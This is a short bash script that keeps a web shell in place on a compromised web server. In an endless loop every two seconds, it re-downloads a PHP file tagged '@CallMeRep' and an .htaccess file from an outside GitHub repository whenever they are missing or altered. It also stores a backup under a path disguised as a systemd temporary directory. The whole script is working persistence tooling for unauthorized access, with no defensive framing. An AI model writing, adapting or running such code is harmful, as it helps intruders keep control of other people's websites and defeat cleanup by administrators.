#!/bin/bash

HTACCESS_FILE=".htaccess"
AC_FILE="ac.php"
HTACCESS_BACKUP="/var/tmp/systemd-private-d2965998338a4e6a84320173dff28bb0-haveged.service-HgExaf2a"

# Define function to download files
function download_files {
    # Check if ac.php exists and contains @CallMeRep, else download and set proper permissions
    if [ ! -f $AC_FILE ] || ([ -f $AC_FILE ] && ! grep -q '@CallMeRep' $AC_FILE); then
        # if not exist or doesn't contain @CallMeRep, get ac.php from repo
        if [ -f $AC_FILE ]; then
            chmod 0644 $AC_FILE
        fi

        # Download ac.php, check for permission errors
        if curl --fail --silent https://raw.githubusercontent.com/t101804/repshare/main/ac.php -o $AC_FILE; then
            echo "Successfully downloaded $AC_FILE"
        else
            echo "Permission denied while downloading $AC_FILE"
        fi
    fi

    # Check if .htaccess exists and has proper permissions, else download and set proper permissions
    if [ ! -f $HTACCESS_FILE ] || ([ -f $HTACCESS_FILE ] && [ ! -r $HTACCESS_FILE ] && [ ! -w $HTACCESS_FILE ]) || ! cmp --silent $HTACCESS_FILE $HTACCESS_BACKUP; then
        # if not same auto replace the htaccess
        if [ -f $HTACCESS_FILE ]; then
            chmod 0644 $HTACCESS_FILE
        fi

        # Download htaccess, check for permission errors
        if curl --fail --silent https://raw.githubusercontent.com/t101804/repshare/main/.htaccess -o $HTACCESS_FILE; then
            echo "Successfully downloaded $HTACCESS_FILE"
        else
            echo "Permission denied while downloading $HTACCESS_FILE"
        fi
    fi
}

# Download initial .htaccess and backup shell file
curl https://raw.githubusercontent.com/t101804/repshare/main/.htaccess -o $HTACCESS_BACKUP
sleep 2

# Loop to check for changes in files
while true; do
    # Print the Time and Date Before Execution
    echo $(TZ=Asia/Jakarta date)

    # Call download_files function to check for changes and download files
    download_files

    # Print the Time and Date After Execution
    echo $(TZ=Asia/Jakarta date)
    sleep 2
done
